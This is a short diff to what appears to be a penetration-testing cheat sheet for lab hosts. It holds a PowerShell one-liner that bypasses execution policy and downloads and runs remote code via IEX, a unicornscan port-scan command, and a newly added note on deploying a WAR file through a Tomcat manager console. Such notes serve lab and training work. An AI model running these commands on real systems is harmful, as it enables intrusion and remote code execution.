@@ -23,3 +23,7 @@ powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('
 
 # unicorn scan
 unicornscan -i tap0 -Ir 160 10.11.1.22:1-4000
+
+# tomcat manager console deploy war 
+10.11.1.209:8080/[war_name]  
+
